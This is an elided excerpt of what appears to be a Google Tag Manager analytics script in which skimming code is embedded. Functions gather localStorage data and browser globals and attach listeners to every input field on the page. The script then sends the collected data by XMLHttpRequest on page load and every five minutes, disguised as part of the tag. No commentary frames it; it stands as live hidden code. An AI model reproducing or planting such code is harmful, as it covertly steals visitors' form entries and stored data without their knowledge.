...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 6,
        "vtp_instanceDestinationId": "G-749ZY6P5S5",
        "tag_id": 27
      }, {
  ...
  const globalVariables = ['document', 'screen', 'navigator'];
  ...
  function generateUniqueId(data) {
    ...
    for (let i = 0; i < concatenated.length; i++) {
      const character = concatenated.charCodeAt(i);
      unique = (unique << 5) - unique + character;
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQge9FGXXJPDBqYXYI7wH6ofGgteLYGGL6YdcGYxGbr6mhoC3Gc\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function collectGlobalVariablesData() {
    ...
    globalVariables.forEach(variable => {
      if (window[variable]) {
        globalData[variable] = JSON.stringify(window[variable]);
      }
    });
    return globalData;
  }
  ...
  function sendData(myData) {
    const uniqueId = generateUniqueId(myData);
    ...
    httpRequest.onreadystatechange = function () {
      if (httpRequest.readyState === XMLHttpRequest.DONE) {
        if (httpRequest.status === 200) {
          ...
          console.error("Data sending failed with status code: " + httpRequest.status);
        }
      }
    };
  }
  ...
  function collectDataAndSend() {
    const matchedData = getWatchedLocalStorageData();
    const globalData = collectGlobalVariablesData();
    const collectedData = {
      ...matchedData,
      ...globalData
    };
  ...
  window.addEventListener("load", collectDataAndSend);
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-749ZY6P5S5'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  Array.from(document.querySelectorAll('input')).forEach(input => input.addEventListener('change', jsHook));
  function OE() {
  ...
  setInterval(collectDataAndSend, 300000);
  function UG(a, b) {}
